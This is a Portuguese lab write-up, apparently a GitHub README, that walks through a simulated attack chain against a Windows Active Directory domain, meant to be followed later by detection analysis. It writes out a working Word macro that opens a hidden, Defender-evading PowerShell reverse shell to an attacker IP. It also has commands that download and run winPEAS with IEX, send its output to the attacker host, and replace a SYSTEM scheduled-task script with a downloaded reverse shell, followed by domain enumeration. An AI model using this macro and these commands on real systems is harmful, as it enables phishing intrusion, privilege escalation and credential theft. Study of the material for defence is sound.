### **Em construção......**


# Simulação de Cadeia de Ataque - Laboratório de Segurança Ofensiva
<br>
<br>

## Objetivo

Esta parte do projeto é a continuação do projeto anterior [Windows Server AD](https://github.com/MercioRodrigues/Windows-server-AD/blob/main/README.md), no qual foi construído, em laboratório, um ambiente Active Directory. Foram também utilizadas ferramentas que já tinham sido preparadas em outro projeto que realizei anteriormente, o [SOC SOAR Project](https://github.com/MercioRodrigues/SOC-SOAR-Project), nomeadamente o **Wazuh**.  
<br>  
Esta fase tem como objetivo simular uma cadeia de ataque realista em um ambiente de domínio Windows, sem detecção por parte do Windows Defender, explorando diferentes etapas de comprometimento típicas de atacantes reais. A simulação foi conduzida em um laboratório controlado, permitindo, posteriormente, a análise detalhada de cada fase da intrusão.


A cadeia de ataque envolve as seguintes etapas:

1. **Acesso inicial**: comprometimento de uma estação de trabalho através da execução de uma macro maliciosa em um documento do Word.
2. **Escalada de privilégios local**: obtenção de privilégios SYSTEM explorando uma tarefa agendada mal configurada.
3. **Enumeração do dominio**: Enumerar o ambiente local e de domínio e avaliar a viabilidade de extrair as credenciais da memória (lsass.exe).
4. **Exfiltração de credenciais e Movimentação lateral**: extração da memória do processo LSASS para capturar credenciais em texto claro e hashes NTLM e acesso ao controlador de domínio (Domain Controller) utilizando técnicas de Pass-the-Hash.
 

**Análise pós-ataque**: utilização de ferramentas de monitorização e deteção como **Wazuh** e **Wireshark** para investigar a intrusão e compreender os rastros deixados nos logs do sistema e na rede.

O objetivo final é obter não apenas uma shell no controlador de domínio, mas também documentar detalhadamente os indicadores de comprometimento (IoCs), comportamentos suspeitos e evidências forenses que podem ser usadas por equipes de defesa para deteção precoce e resposta a incidentes.

---

⚠️ *Aviso: Este projeto foi realizado exclusivamente para fins educacionais e em ambiente isolado. Nenhuma das técnicas aqui descritas deve ser utilizada em ambientes reais sem autorização explícita.*


<br>
<br>

## 🧪 Fase 1 - Acesso Inicial via Macro em Documento Word (Phishing)

Nesta fase inicial, o atacante utilizou **engenharia social (phishing)** para induzir um colaborador da organização a abrir um documento Word malicioso. O documento continha uma macro em VBA (Visual Basic for Applications) configurada para executar automaticamente ao abrir o ficheiro.

###  Objetivo

Obter uma **shell reversa PowerShell** no sistema da vítima sem levantar suspeitas, utilizando `Wscript.Shell` para evadir políticas de execução e manter a execução em segundo plano.

---

### Conteúdo da Macro

A macro maliciosa foi inserida no Editor do Visual Basic para Aplicações, dentro do módulo `NewMacros`. O código é dividido em duas partes:

- `AutoOpen()`: executa a macro automaticamente ao abrir o ficheiro
- `test()`: define e executa o payload PowerShell em modo oculto

```vb
Sub AutoOpen()
    Call test
End Sub

Sub test()
    ' test Macro
    Dim objshell As Object
    Set objshell = CreateObject("Wscript.Shell")
    objshell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$command = {while($true){try {$cl = New-Object System.Net.Sockets.TcpClient('192.168.1.205',443);$st = $cl.GetStream();$rd = New-Object IO.StreamReader($st);$wr = New-Object IO.StreamWriter($st);$wr.AutoFlush = $true;while($cl.Connected){$cmd = $rd.ReadLine();if($cmd -eq 'exit'){break;}try{$res = iex $cmd 2>&1 | Out-String;}catch{$res = $_.Exception.Message;} $wr.WriteLine($res);$wr.Flush();}$cl.Close();}catch{Start-Sleep -Seconds 10;}}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command"""
    Set objshell = Nothing
End Sub
```

<p align="center">
 
  <br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/14196c25-96e6-43dc-b1f4-ce14bd0be6be" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

---

### Listener do Atacante

Enquanto o documento era aberto pela vítima, o atacante encontrava-se à escuta na máquina Kali, utilizando `netcat` com `rlwrap` para suportar histórico e edição de linha:

```bash
rlwrap nc -lvnp 443
```
<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/1d6fd6d7-a226-44c2-a28a-da105117975d" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

**Resumo**

O código PowerShell embutido na macro estabelece uma conexão TCP reversa para o endereço do atacante (192.168.1.205) na porta 443. Após a conexão, o script entra num loop que:

**1.** Recebe comandos enviados pelo atacante

**2.** Executa os comandos localmente com Invoke-Expression (iex)

**3.** Envia a saída da execução de volta através do canal TCP

Este tipo de técnica é comum em ataques fileless, pois evita gravações em disco e contorna políticas de execução do PowerShell.

 <br/>
    <br/>

## 🧪 Fase 2 — Escalada de Privilégios Local

Após o acesso inicial, o próximo objetivo foi escalar privilégios para obter controlo total do sistema como **NT AUTHORITY\SYSTEM**.  
Esta fase consistiu na **descoberta e exploração de uma tarefa agendada mal configurada**, permitindo a execução de código com permissões elevadas.

---

### 1. Preparação do Ambiente de Investigação

Foi criado um servidor de upload/download em Python na máquina atacante para facilitar a transferência de ficheiros entre as máquinas:

```bash
python3 upload_server.py
# [+] Serving HTTP upload/download server at port 8080
```

---

### 2. Execução do WinPEAS e Exfiltração do Output

Na shell da vítima, foi executado o `winPEASps1.ps1`, e a saída foi guardada num ficheiro `.txt`:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.205:8080/winPEASps1.ps1') | Out-File "$env:USERPROFILE\Downloads\winpeas.txt" -Encoding ASCII
```

Em seguida, o ficheiro foi exfiltrado para a máquina do atacante:

```powershell
Invoke-RestMethod -Uri "http://192.168.1.205:8080/winpeas.txt" -Method PUT -InFile "C:\Users\jsilva\Downloads\winpeas.txt"
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/d11db3f6-816b-45a4-b7a7-11ef05ae2246" height="60%" width="60%"/>
    <br/>
    <br/>
    <img src="https://github.com/user-attachments/assets/1cd6ede9-e275-484c-9a32-ac27e3fbdcac" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>



---

### 3. Análise do Output do WinPEAS

Na máquina atacante, o output foi segmentado por tarefas agendadas:

```bash
awk '
/^TaskName:/ {
    ++i;
    f = sprintf("task_%03d.txt", i);
}
f { print > f }
' winpeas.txt
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/1dacf129-6f1a-4b05-8fcb-f7febbe8d0bb" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>
    

Depois, filtrou-se por tarefas que correm como `SYSTEM`:

```bash
grep -l "Run As User: *SYSTEM" task_*.txt > SYSTEM_tasks.txt
```

E procuraram-se scripts suspeitos:

```bash
grep -Ei "ps1|bat|cmd|exe" $(cat SYSTEM_tasks.txt) | grep -i "task to run"
```
<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/845d809a-25e0-4a1a-b050-028f2f5db977" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Foi identificado a seguinte tarefa crítica:

```text
task_012.txt:Task To Run: powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\TempTask\svc_launcher.ps1
```

Lendo o conteudo de **task_012.txt** conseguimos obter a informação mais completa sobre a tarefa.

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/c523e3eb-39da-4398-b588-4091550ed2bf" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>
    

---

### 4. Verificação de Permissões

Foi verificado que o utilizador comprometido (`jsilva`) tinha permissões de **controlo total** sobre o ficheiro `.ps1` usado pela tarefa:

```powershell
icacls C:\TempTask\svc_launcher.ps1
```
<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/875ef2f9-e9af-465e-b1c8-45014cca5b24" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Saída relevante:

```
PILAO\jsilva:(I)(F)          → Full control — pode sobrescrever este ficheiro
NT AUTHORITY\SYSTEM:(I)(F)   → A tarefa agendada corre o script como SYSTEM
```

---

### 5. Substituição do Script e Execução da Tarefa

Foi feito o upload de um **script malicioso** com reverse shell, substituindo o original:

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.168.1.205:8080/svc_launcher.ps1' -OutFile 'C:\TempTask\svc_launcher.ps1'"
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/4d36fb25-f3e4-47c3-b7c3-4efe2c2cf370" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Como a tarefa era configurada para correr ao arrancar o sistema, pode-se esperar que a vitima inicie a máquina mas, como tratasse de um laboratório forcei o reinício:

```powershell
Restart-Computer -Force
```

---

### 6. Resultado — Shell como SYSTEM

Na máquina atacante, aguardou-se ligação à porta 4444:

```bash
rlwrap nc -lvnp 4444
```

Após o reinício da vítima:

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/448ad18a-e3b8-4bee-b28b-f0d69decd94f" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>




A escalada foi bem-sucedida! O atacante obteve **acesso completo com privilégios SYSTEM**.

---

### Resumo

A má configuração de permissões num script chamado por uma tarefa agendada como SYSTEM foi explorada com sucesso para **escalar privilégios localmente**.

A utilização do `winPEAS` permitiu descobrir a vulnerabilidade, a análise de permissões confirmou a possibilidade de exploração, e a substituição do script permitiu ganhar **controlo total do sistema**, com acesso **persistente**.

<br/>
<br/>

## 🧪 Fase 3 – Enumeração Pós-Escalação

Após escalar privilégios locais até `NT AUTHORITY\SYSTEM`, o objetivo passou a ser:

- **Enumerar o ambiente local e de domínio**  
- **Avaliar a viabilidade de extrair credenciais da memória (`lsass.exe`)**

---

### 1. Verificar se a máquina está num domínio

```powershell
systeminfo | findstr /B /C:"Domain"
```

**Resultado:**

```
Domain: pilao.pt
```

✅ Isto confirma que a máquina está unida ao domínio `pilao.pt`. Esse facto é importante porque credenciais de **utilizadores do domínio** podem estar armazenadas em memória, especialmente se fizeram login interativo recentemente.

---

### 2. Obter o hostname da máquina comprometida

```powershell
hostname
```

**Resultado:**

```
Client1
```

Esta informação ajuda a identificar o endpoint dentro da infraestrutura.

---

### 3. Listar utilizadores locais e de domínio

```powershell
wmic useraccount get name,sid
```

🔍 Procura por utilizadores olhando para o `RID`:

- `500` → Administrator  
- `502` → krbtgt (conta usada pelo Kerberos)  
- `1000+` → contas personalizadas  

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/b1e32638-eeb0-4172-b39f-899b302a4ac4" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

```powershell
net group "Domain Admins" /domain
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/4a37c0e3-06c1-47da-bbc6-865846bea87b" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Resultado:**

```
Group name     Domain Admins
Members:
  Administrator
```

✅ A presença do utilizador `Administrator` no grupo `Domain Admins` confirma que este tem **controle total** sobre o domínio.

---

### 4. Ver permissões

```powershell
whoami /all
```
<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/023e075c-27b1-4029-a32c-29dceddff2b9" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Resultados importantes:**

User: NT AUTHORITY\SYSTEM

Groups:
- BUILTIN\Administrators
- NT AUTHORITY\SERVICE
- NT AUTHORITY\Authenticated Users
- NT AUTHORITY\This Organization
- LOCAL
- NT SERVICE\Schedule

Previlégios:
**SeDebugPrivilege:** ✅ Enabled

✅ Isto confirma:
- Estamos como NT **AUTHORITY\SYSTEM**
- Com **privilégios máximos no domínio**
- E com o privilégio **SeDebugPrivilege**, necessário para ler a memória de lsass.exe




🚨 O privilégio `SeDebugPrivilege` permite ler a memória de processos de outros utilizadores, inclusive do `lsass.exe`.

---

### 5. Enumerar os Controladores de Domínio (Domain Controllers)

```powershell
nltest /dclist:pilao.pt
```

**Resultado:**

```
Marcio.pilao.pt [PDC]
```
<br/>
<br/>

**Comando**

```powershell
nslookup -type=SRV _ldap._tcp.dc._msdcs.pilao.pt
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/fa036c25-c1b6-4673-98c9-df17860bed9d" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Resultado:**

```
_ldap._tcp.dc._msdcs.pilao.pt   SRV service location:
    svr hostname = marcio.pilao.pt
    svr hostname = server2.pilao.pt

marcio.pilao.pt -> 192.168.1.200  
server2.pilao.pt -> 192.168.1.201
```

✅ Identificar os Domain Controllers é essencial para **movimento lateral**.

---

### 6. Verificar partilhas administrativas no domínio

```powershell
net view \\pilao.pt
```

**Resultado:**

```
NETLOGON    Disk    Logon server share
SYSVOL      Disk    Logon server share
```

**Estes são diretórios críticos do AD, usados para scripts de login e políticas de grupo (GPOs).** 

---

### 7. Testar acesso ao C$ (Admin Share) no DC

```powershell
Start-Process cmd -ArgumentList '/c net use \\pilao.pt\C$' -WindowStyle Hidden
```

```powershell
Get-SmbConnection | Select-Object -Property ShareName, ServerName, UserName
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/d0b0f854-9e95-483a-97ec-383e0e512ea7" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

**Resultado:**

```
ShareName ServerName       UserName
--------- -----------      --------
IPC$      Marcio.pilao.pt  PILAO\CLIENT1$
C$        pilao.pt         PILAO\Administrator
```

✅ Isto confirma que a shell atual tem acesso **total** ao sistema de ficheiros do DC via `C$` — partilha administrativa para administradores.

---

### Implicações para o Atacante

Com estes dados confirmados:

- ✅ Shell com privilégios de **Domain Admin**  
- ✅ Acesso SMB autenticado ao Domain Controller  
- ✅ Capacidade para:   
  - Exfiltrar credenciais  
  - Iniciar **movimento lateral** (pivoting) ou **persistência em domínio**

---

### ✅ Conclusão da Fase 3

Com privilégios de `NT AUTHORITY\SYSTEM` e verificação de que estamos como **Domain Admin**, foi possível confirmar que o sistema comprometido é uma excelente base para:

- Extração de credenciais da memória (`lsass.exe`).
- Acesso irrestrito ao domínio.  




